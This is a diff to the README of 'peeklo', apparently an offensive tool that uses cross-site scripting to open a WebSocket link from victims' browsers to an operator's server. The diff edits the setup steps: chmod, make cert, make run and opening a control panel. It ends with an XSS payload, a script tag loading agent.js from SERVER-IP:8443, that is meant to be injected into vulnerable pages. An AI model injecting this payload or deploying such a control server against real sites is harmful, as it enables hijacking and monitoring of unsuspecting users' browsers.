@@ -45,31 +45,35 @@ Through an injected XSS payload, peeklo establishes a WebSocket connection to a 
     make install
     ```
 
-3. Generate a self-signed TLS certificate:
+3. (If needed) Make scripts executable:
+
+    ```bash
+    chmod +x gen-cert.sh start.sh
+    ```
+
+4. Generate a self-signed TLS certificate:
 
     ```bash
     make cert
     ```
 
-4. Run the server:
+5. Run the server:
 
     ```bash
     make run
     ```
 
-5. Open your browser and access the control panel:
+6. Open your browser and access the control panel:
 
     ```
-    https://<your-ip>:8443/static/control.html
+    https://SERVER-IP:8443/static/control.html
     ```
 
-6. Inject the XSS payload (example):
+7. Inject the XSS payload (example):
 
     ```html
-    <script src="https://<your-ip>:8443/static/agent.js"></script>
+    <script src="https://SERVER-IP:8443/static/agent.js"></script>
     ```
-
-    Or embed `infect.html` as needed depending on the vulnerability.
 
 ---
 
